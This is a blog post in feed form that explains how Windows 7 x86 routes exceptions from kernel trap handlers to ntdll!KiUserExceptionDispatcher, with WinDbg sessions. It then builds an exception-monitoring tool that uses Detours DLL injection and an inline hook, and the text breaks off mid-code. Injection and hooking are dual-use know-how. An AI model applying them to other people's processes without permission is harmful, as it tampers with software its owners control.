    
    <title type="html"><![CDATA[Having a look at the Windows' User/Kernel exceptions dispatcher]]></title>
    <link href="http://doar-e.github.io/blog/2013/10/12/having-a-look-at-the-windows-userkernel-exceptions-dispatcher/"/>
    
    <updated>2013-10-12T14:03:00+01:00</updated>
    <id>http://doar-e.github.io/blog/2013/10/12/having-a-look-at-the-windows-userkernel-exceptions-dispatcher</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>The purpose of this little post is to create a piece of code able to monitor exceptions raised in a process (a bit like <a href="http://gynvael.coldwind.pl/">gynvael</a>&rsquo;s <a href="http://gynvael.coldwind.pl/?id=148">ExcpHook</a> but in userland), and to generate a report with information related to the exception. The other purpose is to have a look at the internals of course.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>--Exception detected--
</span><span class='line'>ExceptionRecord: 0x0028fa2c Context: 0x0028fa7c
</span><span class='line'>Image Path: D:\Codes\The Sentinel\tests\divzero.exe
</span><span class='line'>Command Line: ..\tests\divzero.exe divzero.exe
</span><span class='line'>PID: 0x00000aac
</span><span class='line'>Exception Code: 0xc0000094 (EXCEPTION_INT_DIVIDE_BY_ZERO)
</span><span class='line'>Exception Address: 0x00401359
</span><span class='line'>EAX: 0x0000000a EDX: 0x00000000 ECX: 0x00000001 EBX: 0x7ffde000
</span><span class='line'>ESI: 0x00000000 EDI: 0x00000000 ESP: 0x0028fee0 EBP: 0x0028ff18
</span><span class='line'>EIP: 0x00401359
</span><span class='line'>EFLAGS: 0x00010246
</span><span class='line'>
</span><span class='line'>Stack:
</span><span class='line'>0x767bc265 0x54f3620f 0xfffffffe 0x767a0f5a
</span><span class='line'>0x767ffc59 0x004018b0 0x0028ff90 0x00000000
</span><span class='line'>
</span><span class='line'>Disassembly:
</span><span class='line'>00401359 (04) f77c241c                 IDIV DWORD [ESP+0x1c]
</span><span class='line'>0040135d (04) 89442404                 MOV [ESP+0x4], EAX
</span><span class='line'>00401361 (07) c7042424304000           MOV DWORD [ESP], 0x403024
</span><span class='line'>00401368 (05) e833080000               CALL 0x401ba0
</span><span class='line'>0040136d (05) b800000000               MOV EAX, 0x0
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s why I divided this post in two big parts:</p>

<ul>
<li>the first one will talk about Windows internals background required to understand how things work under the hood,</li>
<li>the last one will talk about <a href="http://research.microsoft.com/en-us/projects/detours/"><em>Detours</em></a> and how to hook <em>ntdll!KiUserExceptionDispatcher</em> toward our purpose. Basically, the library gives programmers a set of APIs to easily hook procedures. It also has a clean and readable documentation, so you should use it! It is usually used for that kind of things:

<ul>
<li>Hot-patching bugs (no need to reboot),</li>
<li>Tracing API calls (<a href="http://www.rohitab.com/apimonitor">API Monitor</a> like),</li>
<li>Monitoring (a bit like our example),</li>
<li>Pseudo-sandboxing (prevent API calls),</li>
<li>etc.</li>
</ul>
</li>
</ul>


<!--more-->


<h1>Lights on <em>ntdll!KiUserExceptionDispatcher</em></h1>

<p>The purpose of this part is to be sure to understand how exceptions are given back to userland in order to be handled (or not) by the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms680657(v=vs.85">SEH</a>.aspx)/<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681401(v=vs.85">UEF</a>.aspx) mechanisms ; though I&rsquo;m going to focus on Windows 7 x86 because that&rsquo;s the OS I run in my VM. The other objective of this part is to give you the big picture, I mean we are not going into too many details, just enough to write a working exception sentinel PoC later.</p>

<h2>nt!KiTrap*</h2>

<p>When your userland application does something wrong an exception is raised by your CPU: let&rsquo;s say you are trying to do a division by zero (<em>nt!KiTrap00</em> will handle that case), or you are trying to fetch a memory page that doesn&rsquo;t exist (<em>nt!KiTrap0E</em>).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; !idt -a
</span><span class='line'>
</span><span class='line'>Dumping IDT: 80b95400
</span><span class='line'>
</span><span class='line'>00:   8464d200 nt!KiTrap00
</span><span class='line'>01:   8464d390 nt!KiTrap01
</span><span class='line'>02:   Task Selector = 0x0058
</span><span class='line'>03:   8464d800 nt!KiTrap03
</span><span class='line'>04:   8464d988 nt!KiTrap04
</span><span class='line'>05:   8464dae8 nt!KiTrap05
</span><span class='line'>06:   8464dc5c nt!KiTrap06
</span><span class='line'>07:   8464e258 nt!KiTrap07
</span><span class='line'>08:   Task Selector = 0x0050
</span><span class='line'>09:   8464e6b8 nt!KiTrap09
</span><span class='line'>0a:   8464e7dc nt!KiTrap0A
</span><span class='line'>0b:   8464e91c nt!KiTrap0B
</span><span class='line'>0c:   8464eb7c nt!KiTrap0C
</span><span class='line'>0d:   8464ee6c nt!KiTrap0D
</span><span class='line'>0e:   8464f51c nt!KiTrap0E
</span><span class='line'>0f:   8464f8d0 nt!KiTrap0F
</span><span class='line'>10:   8464f9f4 nt!KiTrap10
</span><span class='line'>11:   8464fb34 nt!KiTrap11
</span><span class='line'>[...]
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m sure you already know that but in x86 Intel processors there is a table called the <a href="http://wiki.osdev.org/Interrupt_Descriptor_Table">IDT</a> that stores the different routines that will handle the exceptions. The virtual address of that table is stored in a special x86 register called <em>IDTR</em>, and that register is accessible only by using the instructions <em>sidt</em> (Stores Interrupt Descriptor Table register) and <em>lidt</em> (Loads Interrupt Descriptor Table register).</p>

<p>Basically there are two important things in an IDT entry: the address of the <a href="https://en.wikipedia.org/wiki/Interrupt_handler">ISR</a>, and the segment selector (remember it&rsquo;s a simple index in the <a href="http://wiki.osdev.org/GDT_Tutorial">GDT</a>) the CPU should use.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; !pcr
</span><span class='line'>KPCR for Processor 0 at 84732c00:
</span><span class='line'>    [...]
</span><span class='line'>                    IDT: 80b95400
</span><span class='line'>                    GDT: 80b95000
</span><span class='line'>
</span><span class='line'>kd&gt; dt nt!_KIDTENTRY 80b95400
</span><span class='line'>   +0x000 Offset           : 0xd200
</span><span class='line'>   +0x002 Selector         : 8
</span><span class='line'>   +0x004 Access           : 0x8e00
</span><span class='line'>   +0x006 ExtendedOffset   : 0x8464
</span><span class='line'>
</span><span class='line'>kd&gt; ln (0x8464 &lt;&lt; 10) + (0xd200)
</span><span class='line'>Exact matches:
</span><span class='line'>    nt!KiTrap00 (&lt;no parameter info&gt;)
</span><span class='line'>
</span><span class='line'>kd&gt; !@display_gdt 80b95000
</span><span class='line'>
</span><span class='line'>#################################
</span><span class='line'># Global Descriptor Table (GDT) #
</span><span class='line'>#################################
</span><span class='line'>
</span><span class='line'>Processor 00
</span><span class='line'>Base : 80B95000    Limit : 03FF
</span><span class='line'>
</span><span class='line'>Off.  Sel.  Type    Sel.:Base  Limit   Present  DPL  AVL  Informations
</span><span class='line'>----  ----  ------  ---------  ------- -------  ---  ---  ------------
</span><span class='line'>[...]
</span><span class='line'>0008  0008  Code32  00000000  FFFFFFFF  YES     0    0    Execute/Read, accessed  (Ring 0)CS=0008
</span><span class='line'>[...]
</span></code></pre></td></tr></table></div></figure>


<p>The entry just above tells us that for the processor 0, if a <em>division-by-zero</em> exception is raised the kernel mode routine nt!KiTrap00 will be called with a flat-model code32 ring0 segment (cf GDT dump).</p>

<p>Once the CPU is in <em>nt!KiTrap00</em>&rsquo;s code it basically does a lot of things, same thing for all the other <em>nt!KiTrap</em> routines, but somehow they (more or less) end up in the kernel mode exceptions dispatcher: <em>nt!KiDispatchException</em> (remember <a href="http://gynvael.coldwind.pl/">gynvael</a>&rsquo;s tool ? He was hooking that method!) once they created the <em>nt!_KTRAP_FRAME</em> structure associated with the fault.</p>

<p><img class="center" src="http://doar-e.github.io/images/ntdll.KiUserExceptionDispatcher/butterfly.png" title="nt!KiExceptionDispatch graph from ReactOS" ></p>

<p>Now, you may already have asked yourself how the kernel reaches back to the userland in order to process the exception via the SEH mechanism for example ?</p>

<p>That&rsquo;s kind of simple actually. The trick used by the Windows kernel is to check where the exception took place: if it&rsquo;s from user mode, the kernel mode exceptions dispatcher sets the field <em>eip</em> of the trap frame structure (passed in argument) to the symbol <em>nt!KeUserExceptionDispatcher</em>. Then, <em>nt!KeEloiHelper</em> will use that same trap frame to resume the execution (in our case on <em>nt!KeUserExceptionDispatcher</em>).</p>

<p>But guess what ? That symbol holds the address of <em>ntdll!KiUserExceptionDispatcher</em>, so it makes total sense!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; dps nt!KeUserExceptionDispatcher L1
</span><span class='line'>847a49a0  77476448 ntdll!KiUserExceptionDispatcher
</span></code></pre></td></tr></table></div></figure>


<p>If like me you like illustrations, I&rsquo;ve made a WinDbg session where I am going to show what we just talked about. First, let&rsquo;s trigger our <em>division-by-zero</em> exception:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; bp nt!KiTrap00
</span><span class='line'>kd&gt; g
</span><span class='line'>Breakpoint 0 hit
</span><span class='line'>nt!KiTrap00:
</span><span class='line'>8464c200 6a00            push    0
</span><span class='line'>kd&gt; k
</span><span class='line'>ChildEBP RetAddr
</span><span class='line'>8ec9bd98 01141269 nt!KiTrap00
</span><span class='line'>8ec9bd9c 00000000 divzero+0x1269
</span><span class='line'>kd&gt; u divzero+0x1269 l1
</span><span class='line'>divzero+0x1269:
</span><span class='line'>01141269 f7f0            div     eax,eax
</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s go a bit further in the ISR, and more precisely when the <em>nt!_KTRAP_FRAME</em> is built:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; bp nt!KiTrap00+0x36
</span><span class='line'>kd&gt; g
</span><span class='line'>Breakpoint 1 hit
</span><span class='line'>nt!KiTrap00+0x36:
</span><span class='line'>8464c236 8bec            mov     ebp,esp
</span><span class='line'>kd&gt; dt nt!_KTRAP_FRAME @esp
</span><span class='line'>   +0x000 DbgEbp           : 0x1141267
</span><span class='line'>   +0x004 DbgEip           : 0x1141267
</span><span class='line'>   +0x008 DbgArgMark       : 0
</span><span class='line'>   +0x00c DbgArgPointer    : 0
</span><span class='line'>   +0x010 TempSegCs        : 0
</span><span class='line'>   +0x012 Logging          : 0 &#39;&#39;
</span><span class='line'>   +0x013 Reserved         : 0 &#39;&#39;
</span><span class='line'>   +0x014 TempEsp          : 0
</span><span class='line'>   +0x018 Dr0              : 0
</span><span class='line'>   +0x01c Dr1              : 0
</span><span class='line'>   +0x020 Dr2              : 0
</span><span class='line'>   +0x024 Dr3              : 0x23
</span><span class='line'>   +0x028 Dr6              : 0x23
</span><span class='line'>   +0x02c Dr7              : 0x1141267
</span><span class='line'>   +0x030 SegGs            : 0
</span><span class='line'>   +0x034 SegEs            : 0x23
</span><span class='line'>   +0x038 SegDs            : 0x23
</span><span class='line'>   +0x03c Edx              : 0x1141267
</span><span class='line'>   +0x040 Ecx              : 0
</span><span class='line'>   +0x044 Eax              : 0
</span><span class='line'>   +0x048 PreviousPreviousMode : 0
</span><span class='line'>   +0x04c ExceptionList    : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
</span><span class='line'>   +0x050 SegFs            : 0x270030
</span><span class='line'>   +0x054 Edi              : 0
</span><span class='line'>   +0x058 Esi              : 0
</span><span class='line'>   +0x05c Ebx              : 0x7ffd3000
</span><span class='line'>   +0x060 Ebp              : 0x27fd58
</span><span class='line'>   +0x064 ErrCode          : 0
</span><span class='line'>   +0x068 Eip              : 0x1141269
</span><span class='line'>   +0x06c SegCs            : 0x1b
</span><span class='line'>   +0x070 EFlags           : 0x10246
</span><span class='line'>   +0x074 HardwareEsp      : 0x27fd50
</span><span class='line'>   +0x078 HardwareSegSs    : 0x23
</span><span class='line'>   +0x07c V86Es            : 0
</span><span class='line'>   +0x080 V86Ds            : 0
</span><span class='line'>   +0x084 V86Fs            : 0
</span><span class='line'>   +0x088 V86Gs            : 0
</span><span class='line'>kd&gt; .trap @esp
</span><span class='line'>ErrCode = 00000000
</span><span class='line'>eax=00000000 ebx=7ffd3000 ecx=00000000 edx=01141267 esi=00000000 edi=00000000
</span><span class='line'>eip=01141269 esp=0027fd50 ebp=0027fd58 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
</span><span class='line'>divzero+0x1269:
</span><span class='line'>001b:01141269 f7f0            div     eax,eax
</span><span class='line'>kd&gt; .trap
</span><span class='line'>Resetting default scope
</span></code></pre></td></tr></table></div></figure>


<p>The idea now is to track the modification of the <em>nt!_KTRAP_FRAME.Eip</em> field as we discussed earlier (BTW, don&rsquo;t try to put directly a breakpoint on <em>nt!KiDispatchException</em> with VMware, it just blows my guest virtual machine) via a hardware-breakpoint:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; ba w4 esp+68
</span><span class='line'>kd&gt; g
</span><span class='line'>Breakpoint 2 hit
</span><span class='line'>nt!KiDispatchException+0x3d6:
</span><span class='line'>846c559e c745fcfeffffff  mov     dword ptr [ebp-4],0FFFFFFFEh
</span><span class='line'>kd&gt; dt nt!_KTRAP_FRAME Eip @esi
</span><span class='line'>   +0x068 Eip : 0x77b36448
</span><span class='line'>kd&gt; ln 0x77b36448
</span><span class='line'>Exact matches:
</span><span class='line'>    ntdll!KiUserExceptionDispatcher (&lt;no parameter info&gt;)
</span></code></pre></td></tr></table></div></figure>


<p>OK, so here we can clearly see the trap frame has been modified (keep in mind WinDbg gives you the control <em>after</em> the actual writing). That basically means that when the kernel will resume the execution via <em>nt!KiExceptionExit</em> (or <em>nt!Kei386EoiHelper</em>, two symbols for one same address) the CPU will directly execute the user mode exceptions dispatcher.</p>

<p>Great, I think we have now enough understanding to move on the second part of the article.</p>

<h1>Serial Detourer</h1>

<p>In this part we are going to talk about Detours, what looks like the API and how you can use it to build a userland exceptions sentinel without too many lines of codes. Here is the list of the features we want:</p>

<ul>
<li>To hook <em>ntdll!KiUserExceptionDispatcher</em>: we will use Detours for that,</li>
<li>To generate a tiny readable exception report: for the disassembly part we will use <a href="http://www.ragestorm.net/distorm/">Distorm</a> (yet another easy cool library to use),</li>
<li>To focus x86 architecture: because unfortunately the express version doesn&rsquo;t work for x86_64.</li>
</ul>


<p>Detours is going to modify the first bytes of the API you want to hook in order to redirect its execution in your piece of code: it&rsquo;s called an <em>inline-hook</em>.</p>

<p><img class="center" src="http://doar-e.github.io/images/ntdll.KiUserExceptionDispatcher/detours.png"></p>

<p>Detours can work in two modes:</p>

<ul>
<li>A first mode where you don&rsquo;t touch to the binary you&rsquo;re going to hook, you will need a DLL module you will inject into your binary&rsquo;s memory. Then, Detours will modify in-memory the code of the APIs you will hook. That&rsquo;s what we are going to use.</li>
<li>A second mode where you modify the binary file itself, more precisely the <a href="http://sandsprite.com/CodeStuff/Understanding_imports.html">IAT</a>. In that mode, you won&rsquo;t need to have a DLL injecter. If you are interested in details about those tricks they described them in the <em>Detours.chm</em> file in the installation directory, read it!</li>
</ul>


<p>So our sentinel will be divided in two main parts:</p>

<ul>
<li>A program that will start the target binary and inject our DLL module (that&rsquo;s where all the important things are),</li>
<li>The sentinel DLL module that will hook the userland exceptions dispatcher and write the exception report.</li>
</ul>


<p>The first one is really easy to implement using <a href="https://github.com/0vercl0k/stuffz/blob/master/The%20Sentinel/ProcessSpawner/main.cpp#L66">DetourCreateProcessWithDll</a>: it&rsquo;s going to create the process and inject the DLL we want.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Usage: ./ProcessSpawner &lt;full path dll&gt; &lt;path executable&gt; &lt;excutable name&gt; [args..]
</span></code></pre></td></tr></table></div></figure>


<p>To successfully hook a function you have to know its address of course, and you have to implement the hook function. Then, you have to call <em>DetourTransactionBegin</em>, <em>DetourUpdateThread</em>, <em>DetourTransactionCommit</em> and you&rsquo;re done, wonderful isn&rsquo;t it ?</p>

<p>The only tricky thing, in our case, is that we want to hook <em>ntdll!KiUserExceptionDispatcher</em>, and that function has its own custom calling convention. Fortunately for us, in the <em>samples</em> directory of Detours you can find how you are supposed to deal with that specific case:</p>

<figure class='code'><figcaption><span>KiUserExceptionDispatcher hook</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">VOID</span> <span class="nf">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="n">NTAPI</span> <span class="n">KiUserExceptionDispatcher</span><span class="p">(</span><span class="n">PEXCEPTION_RECORD</span> <span class="n">ExceptionRecord</span><span class="p">,</span> <span class="n">PCONTEXT</span> <span class="n">Context</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="cm">/* Taken from the Excep&#39;s detours sample */</span>
</span><span class='line'>    <span class="kr">__asm</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">xor</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>                <span class="p">;</span> <span class="c1">// Create fake return address on stack.</span>
</span><span class='line'>        <span class="n">push</span>    <span class="n">eax</span>                     <span class="p">;</span> <span class="c1">// (Generally, we are called by the kernel.)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">push</span>    <span class="n">ebp</span>                     <span class="p">;</span> <span class="c1">// Prolog</span>
</span><span class='line'>        <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>                <span class="p">;</span>
</span><span class='line'>        <span class="n">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="n">__LOCAL_SIZE</span>       <span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">EnterCriticalSection</span><span class="p">(</span><span class="o">&amp;</span><span class="n">critical_section</span><span class="p">);</span>
</span><span class='line'>    <span class="n">log_exception</span><span class="p">(</span><span class="n">ExceptionRecord</span><span class="p">,</span> <span class="n">Context</span><span class="p">);</span>
</span><span class='line'>    <span class="n">LeaveCriticalSection</span><span class="p">(</span><span class="o">&amp;</span><span class="n">critical_section</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="kr">__asm</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">mov</span>     <span class="n">ebx</span><span class="p">,</span> <span class="n">ExceptionRecord</span>    <span class="p">;</span>
</span><span class='line'>        <span class="n">mov</span>     <span class="n">ecx</span><span class="p">,</span> <span class="n">Context</span>            <span class="p">;</span>
</span><span class='line'>        <span class="n">push</span>    <span class="n">ecx</span>                     <span class="p">;</span>
</span><span class='line'>        <span class="n">push</span>    <span class="n">ebx</span>                     <span class="p">;</span>
</span><span class='line'>        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">TrueKiUserExceptionDispatcher</span><span class="p">];</span>
</span><span class='line'>        <span class="n">jmp</span>     <span class="n">eax</span>                     <span class="p">;</span>
</span><span class='line'>        <span class="c1">//</span>
</span><span class='line'>        <span class="c1">// The above code should never return.</span>
</span><span class='line'>        <span class="c1">//</span>
</span><span class='line'>        <span class="kt">int</span>     <span class="mi">3</span>                       <span class="p">;</span> <span class="c1">// Break!</span>
</span><span class='line'>        <span class="n">mov</span>     <span class="n">esp</span><span class="p">,</span> <span class="n">ebp</span>                <span class="p">;</span> <span class="c1">// Epilog</span>
</span><span class='line'>        <span class="n">pop</span>     <span class="n">ebp</span>                     <span class="p">;</span>
</span><span class='line'>        <span class="n">ret</span>                             <span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is what looks <em>ntdll!KiUserExceptionDispatcher</em> like in memory after the hook:</p>

<p><img class="center" src="http://doar-e.github.io/images/ntdll.KiUserExceptionDispatcher/hook.png"></p>

<p>Disassembling some instructions pointed by the <em>CONTEXT.Eip</em> field is also really straightforward to do with <em>distorm_decode</em>:</p>

<figure class='code'><figcaption><span>Use distorm3 to disassemble some codes</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">IsBadReadPtr</span><span class="p">((</span><span class="k">const</span> <span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">Context</span><span class="o">-&gt;</span><span class="n">Eip</span><span class="p">,</span> <span class="n">SIZE_BIGGEST_X86_INSTR</span> <span class="o">*</span> <span class="n">MAX_INSTRUCTIONS</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">_DecodeResult</span> <span class="n">res</span><span class="p">;</span>
</span><span class='line'>  <span class="n">_OffsetType</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">Context</span><span class="o">-&gt;</span><span class="n">Eip</span><span class="p">;</span>
</span><span class='line'>  <span class="n">_DecodedInst</span> <span class="n">decodedInstructions</span><span class="p">[</span><span class="n">MAX_INSTRUCTIONS</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">decodedInstructionsCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">res</span> <span class="o">=</span> <span class="n">distorm_decode</span><span class="p">(</span>
</span><span class='line'>      <span class="n">offset</span><span class="p">,</span>
</span><span class='line'>      <span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">Context</span><span class="o">-&gt;</span><span class="n">Eip</span><span class="p">,</span>
</span><span class='line'>      <span class="n">MAX_INSTRUCTIONS</span> <span class="o">*</span> <span class="n">SIZE_BIGGEST_X86_INSTR</span><span class="p">,</span>
</span><span class='line'>      <span class="n">Decode32Bits</span><span class="p">,</span>
</span><span class='line'>      <span class="n">decodedInstructions</span><span class="p">,</span>
</span><span class='line'>      <span class="n">MAX_INSTRUCTIONS</span><span class="p">,</span>
</span><span class='line'>      <span class="o">&amp;</span><span class="n">decodedInstructionsCount</span>
</span><span class='line'>  <span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="n">DECRES_SUCCESS</span> <span class="o">||</span> <span class="n">res</span> <span class="o">==</span> <span class="n">DECRES_MEMORYERR</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">fprintf</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Disassembly:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
